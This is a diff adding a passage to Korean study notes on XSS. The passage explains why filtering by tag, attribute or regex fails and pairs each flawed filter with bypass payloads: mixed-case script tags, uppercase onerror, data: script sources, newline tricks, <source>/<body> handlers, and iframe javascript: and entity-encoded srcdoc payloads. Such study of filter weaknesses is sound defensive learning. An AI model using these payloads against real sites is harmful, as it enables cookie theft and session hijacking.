@@ -182,3 +182,76 @@
 <br/>
 
 ### 잘못된 방식의 XSS 필터링 3: 태그와 속성 기반 필터링
+* 단순히 태그나 속성을 바탕으로 필터링을 하게 되면 우회가 가능한 경우가 많음
+* 취약한 필터링의 예시
+    - 대문자 혹은 소문자만을 인식하는 필터링 우회
+        + HTML은 문법 상 태그와 속성에서 **대소문자를 구분하지 않음** → 특정 키워드의 대소문자를 모두 검사하지 않을 경우 검사하지 않은 케이스만을 사용하거나 대소문자를 혼용하여 이를 우회할 수 있음
+        + 예시
+            - 대소문자를 모두 검사하지 않는 방식의 필터링
+                ```javascript
+                x => !x.includes('script') && !x.include('on') // script, on 문자열만 필터링하고 있음
+                ```
+            - 대소문자 검사가 미흡한 경우의 우회 방법
+                ```html
+                <!-- script 키워드를 대소문자를 혼용하여 나타냄 → script 문자열 필터링 우회 -->
+                <sCRipT>alert(document.cookie)</scrIPT>
+
+                <!-- on 키워드를 대문자로 나타냄 → on 문자열 필터링 우회 -->
+                <img src="x:" ONeRroR="alert(document.cookie)"/> 
+                ```
+    - 잘못된 정규표현식을 사용한 필터 우회
+        + 일반적으로 키워드를 필터링할 때에는 정규표현식(Regex Expression)을 이용함 → **정규표현식 필터링 자체에 문제가 있는 경우** 정규표햔식을 만족하면서 XSS 공격 구문을 삽입하는 것이 가능함
+        + 예시
+            - 스크립트 태그 내에 데이터가 존재하는지 검사하는 정규표현식을 이용한 필터링
+                ```javascript
+                x => !<script[^>]*>[^<]/i.text(x) // <script> 태그 내에 데이터가 존재하는지 검사
+                ```
+                + 우회 방법: ```<script>``` 태그의 ```src``` 속성 이용
+                    ```html
+                    <!-- 태그 내 데이터를 입력하지 않고 src 속성 내에 data: 스키마 을 이용해 데이터를 입력함 -->
+                    <script src="data: ,alert(document.cookie)"></script>
+                    ```
+            - ```img``` 태그에 ```on``` 이벤트 핸들러가 존재하는지 검사하는 정규표현식을 이용한 필터링
+                ```javascript
+                x => !/<img.*on/i.test(x) // <img> 태그 내에 on 이벤트 핸들러의 존재 유무룰 검사
+                ```
+                + 우회 방법: 줄바꿈 문자를 이용 (멀티 라인에 대한 검사 미흡)
+                    ```html
+                    <!-- src="" 다음에 \n을 입력하여 줄을 바꿈으로써 필터링을 우회할 수 있음 -->
+                    <img src=""\nonerror="alert(document.cookie)"/>
+                    ```
+    - 특정 태그 및 속성에 대한 필터링을 다른 태그 및 속성을 이용하여 필터 우회
+        + HTML 내에는 굉장히 다양한 종류의 태그와 속성이 존재함 → XSS 공격을 할 때 보편적으로 사용하는 ```<script>```, ```<img>```, ```<input>``` 등의 태그를 필터링한다고 해서 모든 XSS 공격을 막을 수 있는 것은 아님
+        + 예시
+            - ```<script>```, ```<img>```, ```<input>``` 태그를 사용하지 못하도록 필터링
+                ```javascript
+                x => !/<script|<img|<input/i.test(x) // <script, <img, <input 문자열이 존재하는지 검사
+                ```
+                + 우회 방법: 다른 태그(```<source>```, ```<body>```)를 사용해 공격을 시도
+                    ```html
+                    <!-- <source> 태그의 onerror 이벤트 핸들러를 사용함 -->
+                    <video>
+                        <source onerror="alert(document.domain)"/>
+                    </video>
+
+                    <!-- <body> 태그의 onload 이벤트 핸들러을 사용함 -->
+                    <body onload="alert(document.domain)"/>
+                    ```
+            - 위의 예시에 ```on``` 이벤트 핸들러 및 멀티 라인 문자를 검사하는 필터링을 추가
+                ```javascript
+                x => !/<script|<img|<input|<.*on/i.test(x) // on 이벤트 핸들러 및 멀티 라인 문자 검사
+                ```
+                - 우회 방법: 새로운 inner frame을 생성하는 ```<iframe>``` 태그를 이용하여 우회
+                    ```html
+                    <iframe src="javascript:alert(parent.document.domain)">
+                    <iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">
+                    ```
+                    + 공격에 사용한 ```<ifrmae>``` 태그의 속성 (📚 [```<iframe``` docs](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) 참고)
+                        | 속성 | 설명 |
+                        |---|------|
+                        | ```src``` | 포함될 페이지의 URL를 인자로 받음 <br/> &nbsp;&nbsp; - 활성 하이퍼링크를 이용해 자바스크립트 코드를 삽입하는 것이 가능함 (```javascript:``` 스키마 사용 가능) |
+                        | ```srcdoc``` | 삽입할 인라인 HTML로 src 속성을 재정의함(= inline HTML code를 인자로 받음) <br/> &nbsp;&nbsp; - inner frame 내에 새로운 공격 코드를 입력하는 것이 가능함 <br/> &nbsp;&nbsp;&nbsp;&nbsp; - HTML 속성 내로 삽입됨 → HTML Entity Encoding으로 기존 필터링 우회 가능 |
+
+<br/>
+
+### 잘못된 방식의 XSS 필터링 4: 자바스크립트 함수 및 키워드 필터링
